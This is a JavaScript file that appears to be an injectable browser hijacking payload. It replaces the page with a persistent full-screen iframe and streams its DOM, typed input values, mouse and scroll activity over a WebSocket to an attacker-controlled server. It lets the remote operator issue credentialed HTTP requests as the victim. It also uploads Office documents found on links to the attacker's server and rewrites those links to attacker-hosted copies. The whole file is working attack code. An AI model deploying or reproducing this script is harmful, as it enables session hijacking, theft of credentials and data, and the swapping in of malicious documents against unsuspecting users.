let listening = "off";
let lastSent = 0;
let storedDOM;
let checkedURLs = [];
const MAX_MESSAGES_PER_SECOND = 30;
const taskQueue = [];
let isProcessing = false;

const validExtensions = [
  "docx", "xlsx", "pptx", "docm", "xlsm", "pptm",
  "dotx", "xlsb", "potx", "dotm", "xltm", "potm"
];

const linkSelectors = [
  'a[href]', 'button[data-href]', 'div[data-href]', 'span[data-href]',
  'li[data-href]', 'input[type="button"][data-href]', 'input[type="submit"][data-href]',
  'area[href]', 'source[src]'
];

async function processQueue() {
    if (isProcessing || !taskQueue.length) return;
    isProcessing = true;
    
    const task = taskQueue.shift();
    await task();
    
    isProcessing = false;
    setTimeout(processQueue, 1);
}

function addToQueue(task) {
    taskQueue.push(task);
    processQueue();
}


function getPathTo(element) {
  if (element.id!=='')
    return 'id("'+element.id+'")';
  if (element===document.body)
    return element.tagName;

  let ix= 0;
  const siblings= element.parentNode.childNodes;
  for (let i= 0; i<siblings.length; i++) {
    const sibling= siblings[i];
    if (sibling===element)
      return getPathTo(element.parentNode)+'/'+element.tagName+'['+(ix+1)+']';
    if (sibling.nodeType===1 && sibling.tagName===element.tagName)
      ix++;
  }
}

function sendScroll(iframe, ws){
  const scrollY = iframe.contentWindow.scrollY;
  const now = Date.now();
  if (now - lastSent >= 1000 / MAX_MESSAGES_PER_SECOND) {
    lastSent = now;
    ws.send(JSON.stringify({
      setScroll: {
        scrollY
      }
    }))
  }
}

function sendDOM(iframe, ws) {
  const url = iframe.src;
  const inputs = Array.from(iframe.contentWindow.document.querySelectorAll('input, textarea')).map((input) => {
    return {path: getPathTo(input), value: input.value};
  });
  const scrollY = iframe.contentWindow.scrollY;
  const data = {
    dom: iframe.contentDocument.documentElement.outerHTML,
    inputs,
    scrollY
  };
  const message = JSON.stringify({writeDom: {data, baseURL: url}});
  ws.send(message);
}

function setListening(value, iframe) {
  listening = value;
  if(value === 'on'){
    sendDOM(iframe, ws);
  }
}

function getPersistence() {
  return new Promise((resolve) => {
    document.documentElement.innerHTML = '';
    const iframe = document.createElement('iframe');
    iframe.src = window.location.href;
    iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;z-index:99999';
    document.documentElement.appendChild(iframe);

    iframe.addEventListener('load', () => {
      attachHooks(iframe);
      resolve(iframe);
    });

  });
}


function attachHooks(iframe){

  if(listening === 'on'){
    sendDOM(iframe, ws);
  }

  iframe.contentDocument.addEventListener('mousemove', (event) => {
    if (listening === "on") {
      const mouseX = event.clientX;
      const mouseY = event.clientY;
      const now = Date.now();
      if (now - lastSent >= 1000 / MAX_MESSAGES_PER_SECOND) {
        lastSent = now;
        ws.send(JSON.stringify({
          setMouse: {
            mouseX, mouseY
          }
        }))
      }
    }
  });

  const observer = new MutationObserver((mutations) => {

    if (listening === "on") {
      if (iframe.contentDocument.documentElement.outerHTML != storedDOM){
        storedDOM = iframe.contentDocument.documentElement.outerHTML;
        sendDOM(iframe, ws);
      }
    }

    const linkElements = Array.from(iframe.contentDocument.querySelectorAll(linkSelectors.join(',')));

    linkElements.forEach(element => {
      linkElements.forEach(element => {
        addToQueue(() => handleFileUpload(element));
    });
    });

  });

  observer.observe(iframe.contentDocument.documentElement, {
    childList: true,
    subtree: true,
    attributes: false,
    characterData: true,
  });

  iframe.contentWindow.addEventListener('scroll', (event) => {
    if (listening === "on") {
      sendScroll(iframe, ws)
    }
  });

  const inputs = iframe.contentWindow.document.querySelectorAll('input, textarea');
  inputs.forEach(input => {
    input.addEventListener('input', (event) => {
      if (listening === "on") {
        const inputValue = event.target.value;
        const inputPath = getPathTo(event.target);
        ws.send(JSON.stringify({
          setInput: {
            inputValue,
            inputPath
          }
        }));
      }
    });
  });

}

function checkSameOrigin(url) {
  const locationOrigin = new URL(window.location.href);
  const urlOrigin = new URL(url);

  if (locationOrigin.protocol !== urlOrigin.protocol || locationOrigin.hostname !== urlOrigin.hostname || locationOrigin.port !== urlOrigin.port) {
    return false;
  }

  const locationDomainParts = locationOrigin.hostname.split('.').reverse();
  const urlDomainParts = urlOrigin.hostname.split('.').reverse();

  for (let i = 0; i < Math.min(locationDomainParts.length, urlDomainParts.length); i++) {
    if (locationDomainParts[i] !== urlDomainParts[i]) {
      return false;
    }
  }

  return true;
}

async function checkCorsHeaders(url, headers) {
  try {
    const response = await fetch(url, {
      method: 'OPTIONS',
      mode: 'cors',
      headers: {
        'Access-Control-Request-Method': 'GET',
        'Access-Control-Request-Headers': headers.join(','),
      },
    });

    if (response.ok) {
      const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
      return {
        allowedOrigin: allowedOrigin === window.location.origin,
        allowedHeaders: allowedHeaders ? allowedHeaders.split(',').map((header) => header.trim().toLowerCase()) : [],
      };
    }
  } catch (error) {
    console.error('Error sending preflight request:', error);
  }

  return { allowedOrigin: false, allowedHeaders: [] };
}

async function handleFileUpload(element) {
  let sourceAttribute = "";
  if (element.href) {
    sourceAttribute = "href";
  } else if (element.dataset.href) {
    sourceAttribute = "data-href";
  } else if (element.src) {
    sourceAttribute = "src";
  }

  const url = element[sourceAttribute] || element.getAttribute(sourceAttribute);
  if (checkedURLs.includes(url)) return;

  const sameOrigin = checkSameOrigin(url);

  if (sameOrigin) {
      try {
          const response = await fetch(url);
          if (response.ok) {
              const blob = await response.blob();
              const contentDisposition = response.headers.get('content-disposition');
              let filename = contentDisposition ? contentDisposition.split('filename=')[1] : null;
              filename = filename ? filename.replace(/['"]+/g, '') : null;
      
              if (!filename) {
                  const urlSegments = url.split('/');
                  filename = urlSegments[urlSegments.length - 1];
              }

              const extension = filename ? filename.split('.').pop() : null;

              if (validExtensions.includes(extension)) {
                  const formData = new FormData();
                  formData.append("file", blob, filename);

                  const uploadResponse = await fetch(''{http_direction}'/upload', {
                      method: 'POST',
                      body: formData
                  });

                  if (!uploadResponse.ok) {
                    checkedURLs.push(url);
                    return;
                  }
                  
                  try {
                    const data = await uploadResponse.json();
                    if (data.link) {
                        const newLink = `'{http_direction}'${data.link}`;
                        if (sourceAttribute.startsWith("data-")) {
                            element.dataset[sourceAttribute.split("data-")[1]] = newLink;
                        } else {
                            element.setAttribute(sourceAttribute, newLink);
                        }
                    }
                } catch (jsonError) {
                }
              } else {
                  checkedURLs.push(url);
              }
          }
      } catch (error) {
          console.error('Error fetching the file:', error);
          checkedURLs.push(url);
      }
  } else {
    fetch(''{http_direction}'/upload-via-url', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({url: url}).toString()
  })
  .then(response => {
      if (!response.ok) {
          checkedURLs.push(url);
          throw new Error('No need to process further');
      }
      return response.json();
  })
  .then(data => {
      if (data.link) {
          const newLink = `'{http_direction}'${data.link}`;
          if (sourceAttribute.startsWith("data-")) {
              element.dataset[sourceAttribute.split("data-")[1]] = newLink;
          } else {
              element.setAttribute(sourceAttribute, newLink);
          }
      } else {
          checkedURLs.push(url);
      }
  })
  .catch(error => {
  });
  }
}

async function sendHttpRequest(data, ws) {
  const sameOrigin = checkSameOrigin(data.url);
  let allowedOrigin = false;
  let allowedHeaders = [];

  if (!sameOrigin) {
    const corsHeaders = await checkCorsHeaders(data.url, Object.keys(data.headers || {}));
    allowedOrigin = corsHeaders.allowedOrigin;
    allowedHeaders = corsHeaders.allowedHeaders;
  }

  if (sameOrigin || allowedOrigin) {
    const xhr = new XMLHttpRequest();
    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        let responseData;
        responseData = xhr.responseText;
        const responseHeaders = {};
        xhr.getAllResponseHeaders().split('\r\n').forEach((header) => {
          const [key, value] = header.split(': ');
          if (key) {
            responseHeaders[key] = value;
          }
        });
        ws.send(JSON.stringify({
          requestId: data.requestId,
          data: responseData,
          headers: responseHeaders,
          status_code: xhr.status,
        }));
      }
    };
    xhr.onerror = () => {
      ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0 , requestId: data.requestId}));
    };
    xhr.open(data.method, data.url);
    xhr.withCredentials = true;

    if (!sameOrigin) {
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        if (allowedHeaders.includes(header.toLowerCase())) {
          xhr.setRequestHeader(header, value);
        }
      });
    } else{
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        xhr.setRequestHeader(header, value);
      });
    }
    if (data.method === 'POST' || data.method === 'PUT') {
      xhr.send(data.data);
    } else {
      xhr.send();
    }
  } else {
    ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0, requestId: data.requestId }));
  }
}

let ws = null;

if (window.parent === window) {
  ws = new WebSocket('{websocket_direction}');
  getPersistence().then((iframe) => {

    const linkElements = Array.from(iframe.contentDocument.querySelectorAll(linkSelectors.join(',')));

    linkElements.forEach(element => {
        addToQueue(() => handleFileUpload(element));
    });
    ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      if (message.sendRequest) {
        sendHttpRequest(message.sendRequest, ws);
      } else if (message.listening) {
        setListening(message.listening, iframe);
      }
    };
  });
}

